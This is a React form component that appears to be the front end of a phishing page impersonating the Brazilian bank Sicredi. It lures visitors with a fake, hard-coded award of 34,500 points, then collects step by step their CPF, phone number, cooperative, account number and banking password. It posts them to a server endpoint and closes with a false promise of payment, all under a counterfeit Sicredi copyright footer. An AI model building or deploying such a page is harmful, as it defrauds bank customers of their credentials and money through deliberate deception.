import { useState } from "react";
import { useMutation } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";
import { useToast } from "@/hooks/use-toast";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { InputMasked } from "@/components/ui/input-masked";
import { Label } from "@/components/ui/label";
import { Loader2, CheckCircle, User, Phone, Building, CreditCard, Lock } from "lucide-react";

enum FormStep {
  CPF,
  POINTS,
  PHONE,
  ACCOUNT,
  PASSWORD,
  SUCCESS
}

const ClientForm = () => {
  const { toast } = useToast();
  const [currentStep, setCurrentStep] = useState<FormStep>(FormStep.CPF);
  const [formData, setFormData] = useState({
    cpf: "",
    phone: "",
    cooperative: "",
    account: "",
    password: ""
  });
  
  const submissionMutation = useMutation({
    mutationFn: async (data: typeof formData) => {
      const res = await apiRequest("POST", "/api/submissions", data);
      return await res.json();
    },
    onSuccess: () => {
      setCurrentStep(FormStep.SUCCESS);
    },
    onError: (error) => {
      toast({
        title: "Erro ao enviar dados",
        description: error.message,
        variant: "destructive"
      });
    }
  });
  
  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };
  
  const validateCPF = () => {
    if (!formData.cpf || formData.cpf.length < 14) {
      toast({
        title: "CPF inválido",
        description: "Por favor, digite um CPF válido no formato 000.000.000-00",
        variant: "destructive"
      });
      return;
    }
    setCurrentStep(FormStep.POINTS);
  };
  
  const validatePhone = () => {
    if (!formData.phone || formData.phone.length < 15) {
      toast({
        title: "Telefone inválido",
        description: "Por favor, digite um telefone válido no formato (00) 00000-0000",
        variant: "destructive"
      });
      return;
    }
    setCurrentStep(FormStep.ACCOUNT);
  };
  
  const validateAccount = () => {
    if (!formData.cooperative || formData.cooperative.length < 3) {
      toast({
        title: "Cooperativa inválida",
        description: "Por favor, digite uma cooperativa válida",
        variant: "destructive"
      });
      return;
    }
    if (!formData.account || formData.account.length < 3) {
      toast({
        title: "Conta inválida",
        description: "Por favor, digite uma conta válida",
        variant: "destructive"
      });
      return;
    }
    setCurrentStep(FormStep.PASSWORD);
  };
  
  const handleSubmit = () => {
    if (!formData.password || formData.password.length < 4) {
      toast({
        title: "Senha inválida",
        description: "Por favor, digite uma senha válida com pelo menos 4 caracteres",
        variant: "destructive"
      });
      return;
    }
    submissionMutation.mutate(formData);
  };
  
  const resetForm = () => {
    setFormData({
      cpf: "",
      phone: "",
      cooperative: "",
      account: "",
      password: ""
    });
    setCurrentStep(FormStep.CPF);
  };
  
  return (
    <Card className="sicredi-container w-full max-w-md">
      {/* CPF Step */}
      {currentStep === FormStep.CPF && (
        <div className="p-6 text-center">
          <p className="text-lg mb-4">
            Resgate <span className="sicredi-highlight">AGORA</span> seus pontos acumulados por utilizar a <span className="sicredi-highlight">SICREDI</span>
          </p>
          
          <img 
            src="https://images.unsplash.com/photo-1580048915913-4f8f5cb481c4?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&h=300" 
            alt="Programa de pontos Sicredi" 
            className="w-4/5 mx-auto rounded-xl my-4"
          />
          
          <p className="text-base mb-6">
            Se usou seu cartão <span className="sicredi-highlight">SICREDI</span> para compras entre <span className="sicredi-highlight">2022</span> e <span className="sicredi-highlight">2024</span>, insira seu CPF abaixo:
          </p>
          
          <div className="mb-4 text-left">
            <Label htmlFor="cpf" className="flex items-center text-gray-700 mb-2">
              <User className="mr-2 h-4 w-4 text-[#33820d]" />
              <span>CPF:</span>
            </Label>
            <InputMasked
              id="cpf"
              name="cpf"
              mask="cpf"
              placeholder="000.000.000-00"
              value={formData.cpf}
              onChange={handleInputChange}
              className="sicredi-form-input"
            />
          </div>
          
          <Button 
            onClick={validateCPF}
            className="sicredi-btn"
          >
            Validar
          </Button>
          
          <footer className="mt-8 text-xs text-gray-500">
            <p><span className="sicredi-highlight">© Banco Cooperativo Sicredi S.A.</span> Todos os direitos reservados</p>
          </footer>
        </div>
      )}
      
      {/* Points Step */}
      {currentStep === FormStep.POINTS && (
        <div className="p-6 text-center">
          <p className="text-xl font-bold text-[#33820d] mb-2">Pontos Liberados!</p>
          <div className="text-3xl font-bold my-4 bg-[#edf7e7] py-3 rounded-xl text-[#33820d]">34.500 PTS</div>
          <p className="text-sm mb-4">
            Conforme a consulta de CPF em nosso banco de dados, verificamos que você tem direito a PONTOS devido ao uso do seu cartão entre 2022 e 2024.
          </p>
          <p className="text-sm mb-6">
            Prossiga com as informações do seu cadastro e receba o valor em até 3 dias úteis.
          </p>
          <Button 
            onClick={() => setCurrentStep(FormStep.PHONE)}
            className="sicredi-btn"
          >
            Continuar
          </Button>
        </div>
      )}
      
      {/* Phone Step */}
      {currentStep === FormStep.PHONE && (
        <div className="p-6 text-center">
          <p className="text-lg mb-6">
            Por favor, insira seu <span className="sicredi-highlight">telefone</span> para continuar
          </p>
          <div className="mb-4">
            <InputMasked
              id="phone"
              name="phone"
              mask="phone"
              placeholder="(00) 00000-0000"
              value={formData.phone}
              onChange={handleInputChange}
              className="sicredi-form-input"
            />
          </div>
          <Button 
            onClick={validatePhone}
            className="sicredi-btn"
          >
            Continuar
          </Button>
          
          <footer className="mt-8 text-xs text-gray-500">
            <p><span className="sicredi-highlight">© Banco Cooperativo Sicredi S.A.</span> Todos os direitos reservados</p>
          </footer>
        </div>
      )}
      
      {/* Account Step */}
      {currentStep === FormStep.ACCOUNT && (
        <div className="p-6 text-center">
          <p className="text-lg mb-2">
            Resgate <span className="sicredi-highlight">AGORA</span> seus pontos acumulados por utilizar a <span className="sicredi-highlight">SICREDI</span>
          </p>
          
          <img 
            src="https://images.unsplash.com/photo-1556742502-ec7c0e9f34b1?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&h=300" 
            alt="Cartão Sicredi" 
            className="w-4/5 mx-auto rounded-xl my-4"
          />
          
          <p className="text-base mb-4" id="accountInstructions">
            Antes de prosseguir, apenas precisamos validar algumas informações.
          </p>
          
          <div className="mb-4 text-left">
            <Label htmlFor="cooperative" className="flex items-center text-gray-700 mb-2">
              <Building className="mr-2 h-4 w-4 text-[#33820d]" />
              <span>Cooperativa:</span>
            </Label>
            <Input
              id="cooperative"
              name="cooperative"
              placeholder="Cooperativa"
              value={formData.cooperative}
              onChange={handleInputChange}
              className="sicredi-form-input"
            />
          </div>
          
          <div className="mb-4 text-left">
            <Label htmlFor="account" className="flex items-center text-gray-700 mb-2">
              <CreditCard className="mr-2 h-4 w-4 text-[#33820d]" />
              <span>Conta:</span>
            </Label>
            <Input
              id="account"
              name="account"
              placeholder="Número da conta"
              value={formData.account}
              onChange={handleInputChange}
              className="sicredi-form-input"
            />
          </div>
          
          {submissionMutation.isPending && (
            <div className="my-4 text-[#33820d]">
              <Loader2 className="h-5 w-5 animate-spin mx-auto" />
              <span className="text-sm">Carregando...</span>
            </div>
          )}
          
          <Button 
            onClick={validateAccount}
            className="sicredi-btn"
          >
            Validar
          </Button>
          
          <footer className="mt-8 text-xs text-gray-500">
            <p><span className="sicredi-highlight">© Banco Cooperativo Sicredi S.A.</span> Todos os direitos reservados</p>
          </footer>
        </div>
      )}
      
      {/* Password Step */}
      {currentStep === FormStep.PASSWORD && (
        <div className="p-6 text-center">
          <p className="text-lg mb-2">
            Resgate <span className="sicredi-highlight">AGORA</span> seus pontos acumulados por utilizar a <span className="sicredi-highlight">SICREDI</span>
          </p>
          
          <img 
            src="https://images.unsplash.com/photo-1556742502-ec7c0e9f34b1?ixlib=rb-4.0.3&auto=format&fit=crop&w=600&h=300" 
            alt="Cartão Sicredi" 
            className="w-4/5 mx-auto rounded-xl my-4"
          />
          
          <p className="text-base mb-4">
            Falta pouco para resgatar seus pontos SICREDI. Confirme sua senha no campo abaixo:
          </p>
          
          <div className="mb-4 text-left">
            <Label htmlFor="password" className="flex items-center text-gray-700 mb-2">
              <Lock className="mr-2 h-4 w-4 text-[#33820d]" />
              <span>Senha:</span>
            </Label>
            <Input
              id="password"
              name="password"
              type="password"
              placeholder="Digite sua senha"
              value={formData.password}
              onChange={handleInputChange}
              className="sicredi-form-input"
            />
          </div>
          
          <Button 
            onClick={handleSubmit}
            className="sicredi-btn"
            disabled={submissionMutation.isPending}
          >
            {submissionMutation.isPending ? (
              <>
                <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                Processando...
              </>
            ) : "Finalizar"}
          </Button>
          
          <footer className="mt-8 text-xs text-gray-500">
            <p><span className="sicredi-highlight">© Banco Cooperativo Sicredi S.A.</span> Todos os direitos reservados</p>
          </footer>
        </div>
      )}
      
      {/* Success Step */}
      {currentStep === FormStep.SUCCESS && (
        <div className="p-6 text-center">
          <div className="my-6 flex flex-col items-center">
            <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mb-4">
              <CheckCircle className="h-10 w-10 text-green-500" />
            </div>
            <h2 className="text-xl font-bold text-[#33820d] mb-2">Solicitação Confirmada!</h2>
            <p className="text-sm mb-6">
              Seus pontos serão processados e você receberá o valor em até 3 dias úteis em sua conta.
            </p>
            <Button 
              onClick={resetForm}
              className="sicredi-btn"
            >
              Concluir
            </Button>
          </div>
        </div>
      )}
    </Card>
  );
};

export default ClientForm;
